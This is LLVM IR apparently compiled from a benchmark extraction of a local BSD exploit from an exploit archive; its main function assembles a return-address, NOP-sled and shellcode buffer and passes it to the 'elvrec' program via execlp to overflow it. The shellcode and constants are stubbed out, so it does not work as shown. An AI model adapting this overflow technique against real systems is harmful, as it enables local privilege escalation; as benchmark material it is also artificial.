; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/local/extr_287.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/local/extr_287.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BSIZE = common dso_local global i32 0, align 4
@ESP = common dso_local global i64 0, align 8
@OFFSET = common dso_local global i32 0, align 4
@EATME = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [44 x i8] c"\0A* using ret %#x -> align %d -> offset %d\0A\0A\00", align 1
@VULN = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32 0, align 4
@NOP = common dso_local global i8 0, align 1
@PROG = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [7 x i8] c"elvrec\00", align 1
@.str.2 = private unnamed_addr constant [23 x i8] c"Unable to execute %s\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* @BSIZE, align 4
  %13 = zext i32 %12 to i64
  %14 = call i8* @llvm.stacksave()
  store i8* %14, i8** %6, align 8
  %15 = alloca i8, i64 %13, align 16
  store i64 %13, i64* %7, align 8
  %16 = load i64, i64* @ESP, align 8
  store i64 %16, i64* %8, align 8
  %17 = load i32, i32* %4, align 4
  %18 = icmp sgt i32 %17, 1
  br i1 %18, label %19, label %28

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @atoi(i8* %22)
  store i32 %23, i32* %10, align 4
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 2
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26)
  store i32 %27, i32* %11, align 4
  br label %31

28:                                               ; preds = %2
  %29 = load i32, i32* @OFFSET, align 4
  store i32 %29, i32* %10, align 4
  %30 = load i32, i32* @EATME, align 4
  store i32 %30, i32* %11, align 4
  br label %31

31:                                               ; preds = %28, %19
  %32 = load i32, i32* %10, align 4
  %33 = sext i32 %32 to i64
  %34 = load i64, i64* %8, align 8
  %35 = add nsw i64 %34, %33
  store i64 %35, i64* %8, align 8
  %36 = load i32, i32* @stderr, align 4
  %37 = load i64, i64* %8, align 8
  %38 = load i32, i32* %11, align 4
  %39 = load i32, i32* %10, align 4
  %40 = call i32 (i32, i8*, ...) @fprintf(i32 %36, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0), i64 %37, i32 %38, i32 %39)
  %41 = load i32, i32* %11, align 4
  store i32 %41, i32* %9, align 4
  br label %42

42:                                               ; preds = %52, %31
  %43 = load i32, i32* %9, align 4
  %44 = load i32, i32* @VULN, align 4
  %45 = icmp slt i32 %43, %44
  br i1 %45, label %46, label %55

46:                                               ; preds = %42
  %47 = load i64, i64* %8, align 8
  %48 = load i32, i32* %9, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %15, i64 %49
  %51 = bitcast i8* %50 to i64*
  store i64 %47, i64* %51, align 1
  br label %52

52:                                               ; preds = %46
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 4
  store i32 %54, i32* %9, align 4
  br label %42

55:                                               ; preds = %42
  %56 = load i32, i32* @VULN, align 4
  store i32 %56, i32* %9, align 4
  br label %57

57:                                               ; preds = %70, %55
  %58 = load i32, i32* %9, align 4
  %59 = load i32, i32* @BSIZE, align 4
  %60 = load i32, i32* @shellcode, align 4
  %61 = call i32 @strlen(i32 %60)
  %62 = sub nsw i32 %59, %61
  %63 = sub nsw i32 %62, 100
  %64 = icmp slt i32 %58, %63
  br i1 %64, label %65, label %73

65:                                               ; preds = %57
  %66 = load i8, i8* @NOP, align 1
  %67 = load i32, i32* %9, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %15, i64 %68
  store i8 %66, i8* %69, align 1
  br label %70

70:                                               ; preds = %65
  %71 = load i32, i32* %9, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %9, align 4
  br label %57

73:                                               ; preds = %57
  %74 = load i32, i32* %9, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8, i8* %15, i64 %75
  %77 = load i32, i32* @shellcode, align 4
  %78 = load i32, i32* @shellcode, align 4
  %79 = call i32 @strlen(i32 %78)
  %80 = call i32 @memcpy(i8* %76, i32 %77, i32 %79)
  %81 = load i32, i32* @BSIZE, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %15, i64 %82
  store i8 0, i8* %83, align 1
  %84 = load i8*, i8** @PROG, align 8
  %85 = call i64 @execlp(i8* %84, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0), i8* %15, i32 0)
  %86 = icmp ne i64 %85, 0
  br i1 %86, label %87, label %92

87:                                               ; preds = %73
  %88 = load i32, i32* @stderr, align 4
  %89 = load i8*, i8** @PROG, align 8
  %90 = call i32 (i32, i8*, ...) @fprintf(i32 %88, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0), i8* %89)
  %91 = call i32 @exit(i32 1) #4
  unreachable

92:                                               ; preds = %73
  %93 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %93)
  %94 = load i32, i32* %3, align 4
  ret i32 %94
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i64 @execlp(i8*, i8*, i8*, i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
